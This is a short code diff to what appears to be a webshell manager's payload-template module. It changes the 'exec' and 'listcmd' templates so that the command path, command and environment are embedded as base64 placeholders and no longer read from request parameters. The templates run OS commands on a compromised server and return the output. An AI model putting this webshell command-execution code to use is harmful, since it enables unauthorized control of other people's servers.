@@ -46,15 +46,12 @@ module.exports = (arg1, arg2, arg3) => ({
       return osname.startsWith("win");
     }
     
-    var cmdPath = decode(request.getParameter("${arg1}"));
-    var command = decode(request.getParameter("${arg2}"));
-    var envstr = decode(request.getParameter("${arg3}"));
+    var cmdPath = decode("#{newbase64::bin}");
+    var command = decode("#{newbase64::cmd}");
+    var envstr = decode("#{newbase64::env}");
     
     output.append(ExecuteCommandCode(cmdPath, command, envstr));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::bin}",
-    [arg2]: "#{newbase64::cmd}",
-    [arg3]: "#{newbase64::env}",
   },
   listcmd: {
     _: `
@@ -71,9 +68,8 @@ module.exports = (arg1, arg2, arg3) => ({
       }
       return ret;
     }
-    var z1 = decode(request.getParameter("${arg1}"));
+    var z1 = decode("#{newbase64::binarr}");
     output.append(ListcmdCode(z1));
     `.replace(/\n\s+/g, ""),
-    [arg1]: "#{newbase64::binarr}",
   },
 });
